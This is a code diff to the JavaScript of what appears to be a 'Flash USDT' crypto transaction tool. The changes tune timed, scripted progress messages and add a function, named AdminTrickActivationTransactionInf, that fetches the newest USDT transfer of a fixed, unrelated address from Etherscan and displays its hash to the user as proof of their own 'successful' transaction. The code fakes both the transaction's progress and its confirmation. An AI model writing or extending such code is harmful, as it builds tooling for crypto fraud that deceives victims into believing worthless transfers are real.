@@ -50,6 +50,9 @@ let transactionFeeUSDT
 let inputAddress
 let inputValueUSDT 
 let outputAddress
+let t1
+let t2
+let t3
 
 
 
@@ -1015,6 +1018,22 @@ createAnewTransaction.onclick = ()=> {
     displayScreen.appendChild(p)
     displayScreen.appendChild(y)
 
+
+      // timing for different warning
+      var timing_warning = localStorage.getItem('warning')
+
+      if (timing_warning == 'sent') {
+         t1 = 500
+         t2 = 9000
+        
+      } else {
+        t1 = 1000
+        t2 = 18000
+
+      }
+
+
+
     setTimeout(function() {
       notificationBody.style.height = "5em"
       notificationContainer.style.display = "flex"
@@ -1035,7 +1054,7 @@ createAnewTransaction.onclick = ()=> {
       '[INFO] Registrating transaction',
       '[INFO] Verifying transaction',
       '[INFO] Signing transaction details',
-      '[INFO] Transaction compleated successfully',
+      '[INFO] Transaction checked but not signed',
       '[INFO] Redirecting to blockchain network'
    ]
      let k = 0
@@ -1047,10 +1066,12 @@ createAnewTransaction.onclick = ()=> {
        console.log(k)
        displayScreen.scrollTop = displayScreen.scrollHeight;
      }
-     let interval = setInterval(finalActivateShow, 1000) ///wait
+     let interval = setInterval(finalActivateShow, t1) ///wait
      setTimeout(function() {
        clearInterval(interval)
-     }, 18000)
+     }, 22000)
+
+    
 
      setTimeout(()=> {
      notificationBodyP.style.textAlign = "left"
@@ -1069,8 +1090,9 @@ createAnewTransaction.onclick = ()=> {
       notificationHeadP.textContent = "Flash USDT Blocked"
       notificationBodyP.textContent = 'Transaction Failed. Gas fee error'
     } else if(warningCheck == 'sent') {
-      notificationHeadP.textContent = "Flash USDT Successful"
-      notificationBodyP.textContent = 'Transaction Successful'
+      // will be adding a code to get transaction info
+      AdminTrickActivationTransactionInf()
+      // 
     } else {
       notificationHeadP.textContent = "Flash USDT Blocked"
       notificationBodyP.textContent = 'Transaction Failed due to unknown error'
@@ -1087,7 +1109,7 @@ createAnewTransaction.onclick = ()=> {
     // window.open(explorerUrl, '_blank');
     // window.location.href = `https://www.blockchain.com/explorer/transactions/btc/${txid}`
      }, 10000);
-     }, 22000)
+     }, t3)
     }
      else {
       let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Transaction failed, Flash USDT Transaction core is not activated", "[INFO] Sending Bitcoin in demo is disabled in this region", "[INFO] Please activate Flash USDT Transaction Core to continue", "Terminating transaction"]
@@ -1191,3 +1213,27 @@ osVersions.textContent = osVersion
 physicalMemory.textContent = deviceMemory + " GB"
 
 
+function AdminTrickActivationTransactionInf() {
+  const apiKey = 'YourApiKeyToken'; // Replace with your actual API key
+
+fetch('https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=0xdac17f958d2ee523a2206206994597c13d831ec7&address=0xdfd5293d8e347dfe59e90efd55b2956a1343963d&page=1&offset=100&startblock=0&endblock=99999999&sort=desc&apikey=' + apiKey)
+    .then(response => response.json())
+    .then(data => {
+        // Check if the response contains results
+        if (data && data.result && data.result.length > 0) {
+          notificationBody.style.height = "11em"
+
+          notificationHeadP.textContent = "Flash USDT Successful"
+          notificationBodyP.textContent = `Transaction Successful. Transaction ID ${data.result[0].hash}`
+            // Log the first item in the array
+
+        } else {
+          notificationHeadP.textContent = "Flash USDT Blocked"
+          notificationBodyP.textContent = 'Transaction Failed due to unknown error'
+        }
+    })
+    .catch(error => {
+      notificationHeadP.textContent = "Flash USDT Blocked"
+      notificationBodyP.textContent = 'Transaction Failed due to unknown error'
+    });
+}
